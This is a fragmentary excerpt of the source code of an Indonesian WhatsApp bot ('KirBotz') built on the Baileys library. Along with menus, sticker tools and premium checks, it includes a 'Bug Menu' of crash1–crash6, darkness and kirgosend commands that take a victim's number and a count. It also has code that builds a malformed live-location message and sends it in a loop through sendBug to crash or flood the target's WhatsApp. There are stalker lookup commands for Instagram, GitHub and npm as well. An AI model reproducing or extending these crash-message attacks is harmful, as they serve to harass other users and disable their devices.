...
"mediaType": 1, 
"thumbnail": thumb,
"mediaUrl": 'https://wa.me/6281356484612?text=Assalamualaikum+Kakak+Ganteng',
"sourceUrl": 'https://wa.me/6281356484612?text=Assalamualaikum+Kakak+Ganteng'
}}},{quoted:m})
}
...
text: '', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6281356484612`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6281356484612`}},
...
│⭔${prefix}igstalk [ namainstagram ]
│⭔${prefix}githubstalk [ namagithub ]
│⭔${prefix}npmstalk [ namanpm ]
╰────────────˧
╭─▸ 𝑩𝒖𝒈 𝑴𝒆𝒏𝒖
│⭔👻 [ jumlah ] 
│⭔💀 [ jumlah ] 
...
│⭔️🌻 [ jumlah ] 
│⭔🤡 [ jumlah ]
│⭔️${prefix}darkness [ jumlah ]
│⭔️${prefix}crash1 [ jumlah ]
│⭔️${prefix}crash2 [ jumlah ]
│⭔️${prefix}crash3 [ jumlah ]
│⭔️${prefix}crash4 [ jumlah ]
│⭔️${prefix}crash5 [ jumlah ]
│⭔️${prefix}crash6 [ jumlah ]
│⭔${prefix}kirgosend [ jumlah ]
│⭔️${prefix}kirgosend1 [ jumlah ]
│⭔️${prefix}kirgosend2 [ jumlah ]
│⭔️${prefix}kirgosend3 [ jumlah ]
│⭔️${prefix}kirgosend4 [ jumlah ]
│⭔️${prefix}kirgosend5 [ jumlah ]
│⭔️${prefix}kirgosend6 [ jumlah ]
│⭔${prefix}send1 [ nomor ]
│⭔${prefix}send2 [ nomor ]
│⭔${prefix}send3 [ nomor ]
│⭔${prefix}send4 [ nomor ]
...
│⭔${prefix}scircle [ reply image ]
│⭔${prefix}snobg [ reply image ]
╰────────────˧
╭─▸ 𝑫𝒐𝒘𝒏𝒍𝒐𝒂𝒅 𝑴𝒆𝒏𝒖
│⭔${prefix}gitclone [ linkrepo ]
...
if (!q) return reply('link githubnya mana? contoh: https://github.com/adiwajshing/baileys')
...
if (!q) return reply(`Contoh ${prefix+command} dantadev`)
...
case "npmstalk":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Contoh ${prefix+command} lolhuman-api`)
reply("```Stalker Process```")
...
text: wm, 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6281256484612`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6281356484612`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6281356484612`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6281356484612`}},
...
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-kirbotz ⸸⁶⁶⁶_さん ${buttonvir}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
sendBug(num)
...
sock.sendKatalog(num, `ৡৢ͜͡𝟒𝟎𝟒-kirbotz ⸸⁶⁶⁶_さん ${buttonvir}`, `ৡৢ͜͡𝟒𝟎𝟒-kirbotz ⸸⁶⁶⁶_さん ${buttonvir}`, thumb, { quoted: lep })
...
let encmedia = await sock.sendStimg(m.chat, await remove(media), m, { packname: "Sticker By KirBotz\nWA : 6281356484612\nSave Yah Buat Cewek-cewek", author: "" })
...
let encmedia = await sock.sendStimg(m.chat, media, m, { packname: "Sticker By KirBotz\nWA : 6281356484612\nSave Yah Buat Cewek-cewek", author: "" })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await sock.sendStvid(m.chat, media, m, { packname: "Sticker By KirBotz\nWA : 6281356484612\nSave Yah Buat Cewek-cewek", author: "" })
await fs.unlinkSync(encmedia)
} else {
